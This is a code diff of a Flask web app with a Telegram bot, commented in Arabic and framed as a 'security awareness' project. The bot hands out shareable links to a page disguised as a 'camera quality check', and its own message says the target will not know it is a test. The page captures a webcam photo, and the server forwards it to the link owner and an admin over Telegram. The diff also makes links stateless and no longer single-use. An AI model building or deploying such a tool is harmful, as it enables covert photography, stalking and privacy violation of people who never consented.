@@ -1,29 +1,46 @@
 
 """
 Camera Awareness Bot - بوت قياس الوعي الأمني
-مشروع تعليمي مفتوح المصدر
+مشروع تعليمي مفتوح المصدر - متوافق مع Vercel
 """
 
 import os
-import uuid
 import base64
 import requests
+import json
 from io import BytesIO
 from flask import Flask, render_template, request, jsonify
-from config import TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID, WEB_DOMAIN, WEBHOOK_SECRET
 
 app = Flask(__name__)
 
-# تخزين مؤقت للروابط النشطة
-active_links = {}
+# استيراد الإعدادات من متغيرات البيئة
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
+WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "").rstrip('/')
+WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my_secret_token")
 
 BASE_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+
+def encode_data(chat_id):
+    """تشفير معرف الدردشة في الرابط ليكون Stateless"""
+    data = json.dumps({"c": chat_id}).encode('utf-8')
+    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
+
+def decode_data(encoded_str):
+    """فك تشفير معرف الدردشة من الرابط"""
+    try:
+        # إضافة الحشوة المفقودة
+        padding = '=' * (4 - len(encoded_str) % 4)
+        data = base64.urlsafe_b64decode(encoded_str + padding).decode('utf-8')
+        return json.loads(data).get("c")
+    except:
+        return None
 
 def send_telegram_photo(chat_id, photo_bytes, caption=""):
     """إرسال صورة لمحادثة تليجرام"""
     url = f"{BASE_URL}/sendPhoto"
     files = {"photo": ("capture.jpg", photo_bytes, "image/jpeg")}
-    data = {"chat_id": chat_id, "caption": caption}
+    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
     try:
         response = requests.post(url, files=files, data=data, timeout=30)
         return response.json()
@@ -45,27 +62,24 @@ def send_telegram_message(chat_id, text):
 @app.route("/")
 def home():
     """الصفحة الرئيسية"""
-    return "<h1>Camera Awareness Bot</h1><p>استخدم /start في البوت للحصول على رابط</p>"
+    return "<h1>Camera Awareness Bot is Running</h1><p>استخدم البوت في تليجرام للحصول على رابط.</p>"
 
-@app.route("/capture/<link_id>")
-def capture_page(link_id):
+@app.route("/capture/<token>")
+def capture_page(token):
     """صفحة التقاط الكاميرا"""
-    if link_id not in active_links:
+    chat_id = decode_data(token)
+    if not chat_id:
         return "<h1>رابط غير صالح أو منتهي</h1>", 404
+    return render_template("index.html", link_id=token)
 
-    owner_chat_id = active_links[link_id]["chat_id"]
-    return render_template("index.html", link_id=link_id)
-
-@app.route("/upload/<link_id>", methods=["POST"])
-def upload_photo(link_id):
+@app.route("/upload/<token>", methods=["POST"])
+def upload_photo(token):
     """استقبال الصورة من المتصفح"""
-    if link_id not in active_links:
+    owner_chat_id = decode_data(token)
+    if not owner_chat_id:
         return jsonify({"status": "error", "message": "رابط غير صالح"}), 404
 
-    owner_chat_id = active_links[link_id]["chat_id"]
-
     try:
-        # استلام الصورة من الطلب
         data = request.json
         image_data = data.get("image", "")
 
@@ -80,39 +94,27 @@ def upload_photo(link_id):
         caption_owner = "📸 <b>تم التقاط صورة!</b>\n\n" \
                         "✅ المستخدم وافق على إذن الكاميرا\n" \
                         "⚠️ هذا يعني أنه قد يكون عرضة لهجمات التصيد"
-
+        
         send_telegram_photo(owner_chat_id, BytesIO(image_bytes), caption_owner)
 
-        # إرسال نسخة للأدمن
-        caption_admin = f"📸 <b>تقرير وعي أمني</b>\n\n" \
-                        f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
-                        f"🔗 معرف الرابط: <code>{link_id}</code>\n" \
-                        f"📊 النتيجة: وافق على إذن الكاميرا"
-
-        send_telegram_photo(ADMIN_CHAT_ID, BytesIO(image_bytes), caption_admin)
-
-        # إرسال رسالة تلخيصية للأدمن
-        send_telegram_message(ADMIN_CHAT_ID, 
-            f"✅ <b>تم استلام صورة جديدة</b>\n"
-            f"صاحب الرابط: {owner_chat_id}\n"
-            f"الحالة: المستخدم وافق على الكاميرا")
-
-        # حذف الرابط بعد الاستخدام (للأمان)
-        del active_links[link_id]
+        # إرسال نسخة للأدمن (إذا كان مختلفاً عن صاحب الرابط)
+        if str(owner_chat_id) != str(ADMIN_CHAT_ID):
+            caption_admin = f"📸 <b>تقرير وعي أمني</b>\n\n" \
+                            f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
+                            f"📊 النتيجة: وافق على إذن الكاميرا"
+            send_telegram_photo(ADMIN_CHAT_ID, BytesIO(image_bytes), caption_admin)
 
         return jsonify({"status": "success", "message": "تم إرسال الصورة"})
 
     except Exception as e:
-        print(f"Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route("/decline/<link_id>", methods=["POST"])
-def decline_capture(link_id):
+@app.route("/decline/<token>", methods=["POST"])
+def decline_capture(token):
     """المستخدم رفض إعطاء إذن الكاميرا"""
-    if link_id not in active_links:
+    owner_chat_id = decode_data(token)
+    if not owner_chat_id:
         return jsonify({"status": "error", "message": "رابط غير صالح"}), 404
-
-    owner_chat_id = active_links[link_id]["chat_id"]
 
     # إبلاغ صاحب الرابط
     send_telegram_message(owner_chat_id, 
@@ -121,56 +123,44 @@ def decline_capture(link_id):
         "✅ هذا يعني وعياً أمنياً جيداً")
 
     # إبلاغ الأدمن
-    send_telegram_message(ADMIN_CHAT_ID, 
-        f"🛡️ <b>تقرير وعي أمني - رفض</b>\n\n" \
-        f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
-        f"🔗 معرف الرابط: <code>{link_id}</code>\n" \
-        f"📊 النتيجة: رفض إذن الكاميرا (واعٍ أمنياً)")
-
-    # حذف الرابط
-    del active_links[link_id]
+    if str(owner_chat_id) != str(ADMIN_CHAT_ID):
+        send_telegram_message(ADMIN_CHAT_ID, 
+            f"🛡️ <b>تقرير وعي أمني - رفض</b>\n\n" \
+            f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
+            f"📊 النتيجة: رفض إذن الكاميرا")
 
     return jsonify({"status": "success", "message": "تم التسجيل"})
 
-
 # Webhook endpoint
-@app.route(f"/{WEBHOOK_SECRET}", methods=["POST"])
+@app.route(f"/webhook/{WEBHOOK_SECRET}", methods=["POST"])
 def webhook():
+    # التحقق من سر الويب هوك للأمان
     if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != WEBHOOK_SECRET:
         return "Unauthorized", 403
     
     update = request.get_json()
-    if not update:
+    if not update or "message" not in update:
         return "", 200
 
-    if "message" in update:
-        message = update["message"]
-        chat_id = message["chat"]["id"]
-        text = message.get("text", "")
+    message = update["message"]
+    chat_id = message["chat"]["id"]
+    text = message.get("text", "")
 
-        if text == "/start":
-            link_id = str(uuid.uuid4())[:8]
-            active_links[link_id] = {"chat_id": chat_id}
-            capture_url = f"{WEB_DOMAIN}/capture/{link_id}"
-            send_telegram_message(chat_id,
-                f"✅ <b>تم إنشاء رابط الفحص بنجاح!</b>\n\n" \
-                f"🔗 <code>{capture_url}</code>\n\n" \
-                f"📤 شارك هذا الرابط مع من تريد اختباره.\n" \
-                f"سيظهر له كصفحة 'فحص جودة الكاميرا' ولن يشعر بأنه اختبار أمني.")
-        elif text == "/help":
-            send_telegram_message(chat_id,
-                "<b>📖 أوامر البوت:</b>\n\n" \
-                "/start - توليد رابط جديد\n" \
-                "/help - عرض هذه الرسالة\n\n" \
-                "<b>كيفية الاستخدام:</b>\n" \
-                "1. أرسل /start\n" \
-                "2. شارك الرابط مع من تريد اختبار وعيه\n" \
-                "3. انتظر النتيجة!")
+    if text == "/start":
+        token = encode_data(chat_id)
+        capture_url = f"{WEB_DOMAIN}/capture/{token}"
+        send_telegram_message(chat_id,
+            f"✅ <b>تم إنشاء رابط الفحص بنجاح!</b>\n\n" \
+            f"🔗 <code>{capture_url}</code>\n\n" \
+            f"📤 شارك هذا الرابط مع من تريد اختباره.\n" \
+            f"سيظهر له كصفحة 'فحص جودة الكاميرا' ولن يشعر بأنه اختبار أمني.")
+    elif text == "/help":
+        send_telegram_message(chat_id,
+            "<b>📖 أوامر البوت:</b>\n\n" \
+            "/start - توليد رابط جديد\n" \
+            "/help - عرض هذه الرسالة")
+            
     return "", 200
 
-
 if __name__ == "__main__":
-    # في بيئة Vercel، يتم تشغيل التطبيق بواسطة Gunicorn أو ما شابه، ولا نحتاج لـ app.run هنا
-    # ولكن لأغراض التطوير المحلي، يمكن تشغيله هكذا:
-    # app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
     pass
